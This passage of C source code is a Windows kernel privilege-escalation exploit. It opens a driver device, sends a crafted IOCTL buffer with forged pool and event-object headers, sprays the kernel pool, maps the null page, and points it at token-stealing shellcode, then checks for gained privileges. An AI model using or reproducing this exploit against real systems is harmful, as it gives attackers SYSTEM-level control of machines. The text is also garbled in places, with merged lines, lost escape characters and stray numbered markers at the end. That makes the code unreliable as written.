        FILE_ATTRIBUTE_NORMAL,
        0
    );
    if (hdevice == INVALID_HANDLE_VALUE)
    {
        printf("[x] Couldn't open devicen");
    }
    NTSTATUS ret = DeviceIoControl(hdevice,
        0x95382623,
        user_buff,
        0x1000,
        out_buff,
        40,
        &bytes_returned,
        0);
    CloseHandle(hdevice);
    return 0;
    }
    void spray_pool(HANDLE handle_arr[])
    {
    //create SPRAY_SIZE event objects filling up the pool
    for (int i = 0; i PrivilegeCount;
    HeapFree(GetProcessHeap(), 0, current_priv);
    CloseHandle(htoken);
    temp = old_count;       //store the old count
    *updated_count = new_count; //update the count 
    if (new_count > old_count)
    {
        printf("[+] We now have %d privilegesn", new_count);
        return TRUE;
    }
    else
        return FALSE;
    }
    int main()
    {
    HANDLE h_flip_thread;
    HANDLE h_ioctl_thread;
    HANDLE handle_arr[SPRAY_SIZE] = { 0 };
    DWORD mask = 0;
    DWORD orig_priv_count = 0;
    char *user_buff;
    check_priv_count(-1, &orig_priv_count);
    printf("[+] Original priv count: %dn", orig_priv_count);
    if (!map_null_page())
    {
        return -1;
    }
    *(ULONG *)0x74 = (ULONG)&TokenStealingShellcode;
    user_buff = (char *)VirtualAlloc(NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_NOCACHE | PAGE_READWRITE);
    if (user_buff == NULL)
    {
        printf("[x] Couldn't allocate memory for buffern");
        return -1;
    }
    memset(user_buff, 0x41, 0x1000);
    *(ULONG *)(user_buff + 0x34) = 0x00000052; //set the size initially to 0x51
    //pool header block
    *(ULONG *)(user_buff + 0x374) = 0x04080070; //ULONG1
    *(ULONG *)(user_buff + 0x378) = 0xee657645;//PoolTag
    //QuotaInfo block
    *(ULONG *)(user_buff + 0x37c) = 0x00000000; //PagedPoolCharge
    *(ULONG *)(user_buff + 0x380) = 0x00000040; //NonPagedPoolCharge
    *(ULONG *)(user_buff + 0x384) = 0x00000000; //SecurityDescriptorCharge
    *(ULONG *)(user_buff + 0x388) = 0x00000000; //SecurityDescriptorQuotaBlock
    //Event header block
    *(ULONG *)(user_buff + 0x38c) = 0x00000001; //PointerCount
    *(ULONG *)(user_buff + 0x390) = 0x00000001; //HandleCount
    *(ULONG *)(user_buff + 0x394) = 0x00000000; //NextToFree
    *(ULONG *)(user_buff + 0x398) = 0x00080000; //TypeIndex   
[2]   
[3]   
[4]   
[5]   
[6] 